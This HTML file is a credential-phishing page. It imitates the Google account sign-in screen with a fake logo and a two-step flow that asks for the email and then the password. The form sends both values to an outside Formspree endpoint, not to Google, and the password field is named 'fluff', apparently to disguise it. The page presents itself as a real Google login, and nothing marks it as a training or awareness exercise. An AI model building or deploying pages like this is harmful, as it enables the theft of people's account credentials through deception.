<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Google account</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #1e1f20;
            color: black;
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .container {
            background-color: #0e0e0e;
            padding: 30px;
            border-radius: 25px;
            width: 970px;
            height: 345px;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            position: relative;
        }
        .logo {
            font-size: 44px;
            font-weight: 700;
            color: white;
            position: absolute;
            top: 25px;
            left: 20px;
            display: flex;
            align-items: center;
        }
        .logo img {
            width: 54px;
            margin-right: 10px;
        }
        .text-container {
            position: absolute;
            top: 60px;
            left: 20px;
            text-align: left;
        }
        #signinText {
            font-size: 38px;
            font-weight: 400;
            margin-bottom: 0;
        }
        #useGoogleText {
            font-size: 16px;
            font-weight: 500;
        }
        .right-side-container {
            width: 50%;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            margin-left: auto;
            margin-top: 70px;
        }
        .input-box {
            width: 120%;  /* Increased the width to make it longer */
            padding: 18px;
            border: 0.5px solid #c6c7c5;
            background-color: #0e0e0d;
            color: #c4c8c5;
            border-radius: 5px;
            font-size: 16px;
            margin-bottom: 12px;
            border-color: #e4e4e3;
        }
        .input-box::placeholder {
            color: #c4c8c5; /* Change placeholder color */
        }
        .link {
            color: #8ab4f8;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-email-link {
            margin-top: 5px;
            align-self: flex-start;
            font-weight: 300;
        }
        .guest-mode {
            font-size: 14px;
            color: white;
            margin-top: 40px;
            text-align: left;
            width: 90%; /* Increased width for longer guest info */
        }
        .btn-container {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            margin-top: 70px;
            width: 100%;
            gap: 15px;
        }
        .btn {
            background: #8ab4f8;
            color: black;
            padding: 10px 20px;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 100;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            text-align: center;
            color: white;
            width: 100%;
            font-weight: 500;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .footer a {
            color: white;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer-links {
            display: flex;
            justify-content: center;
            margin-top: 5px;
        }
        #passwordLabel {
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container" id="signinBox">
        <div class="logo">
            <img src="https://storage.googleapis.com/libraries-lib-production/images/GoogleLogo-canvas-404-300px.original.png" alt="Google Logo">
        </div>

        <div class="text-container">
            <p id="signinText">Sign in</p>
            <p id="useGoogleText">Use your Google Account</p>
        </div>

        <div class="right-side-container">
            <!-- Create a form to submit to Formspree -->
            <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST">
                <input type="email" id="emailInput" name="email" class="input-box" placeholder="Email or phone" autocomplete="username">
                <div id="passwordContainer" style="display: none;">
                    <label for="fluff" id="passwordLabel">Password</label> <!-- Changed label to Password -->
                    <input type="password" id="passwordInput" name="fluff" class="input-box" placeholder="Enter your password" autocomplete="current-password"> <!-- Changed placeholder -->
                </div>

                <a href="#" class="link forgot-email-link" id="forgotEmailLink">Forgot email?</a>

                <div class="guest-mode">
                    Not your computer? Use a private browsing window to sign in. <br>
                    <a href="#" class="link">Learn more about using Guest mode</a>
                </div>

                <div class="btn-container">
                    <a href="#" class="link" id="createAccountLink">Create account</a>
                    <button type="submit" class="btn" id="nextButton" onclick="goToPasswordPage(event)">Next</button>
                </div>
            </form>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">English (United Kingdom)</a> |
            <a href="#">Help</a> |
            <a href="#">Privacy</a> |
            <a href="#">Terms</a>
        </div>
    </div>

    <script>
        function goToPasswordPage(event) {
            event.preventDefault(); // Prevent form submission for now

            var email = document.getElementById('emailInput').value;

            if (email) {
                document.getElementById('signinText').textContent = 'Enter your password'; // Change text to 'Enter your password'
                document.getElementById('useGoogleText').style.display = 'none';
                document.getElementById('emailInput').style.display = 'none';
                document.getElementById('forgotEmailLink').style.display = 'none';
                document.getElementById('createAccountLink').style.display = 'none';
                document.getElementById('passwordContainer').style.display = 'block';
                document.getElementById('nextButton').textContent = 'Sign In';
                document.getElementById('nextButton').setAttribute('onclick', 'submitPassword(event)');
            } else {
                alert("Please enter an email address.");
            }
        }

        function submitPassword(event) {
            // Handle the form submission here (Formspree will handle the email and fluff)
            // We can remove this line as the form submission will happen automatically
        }
    </script>
</body>
</html>
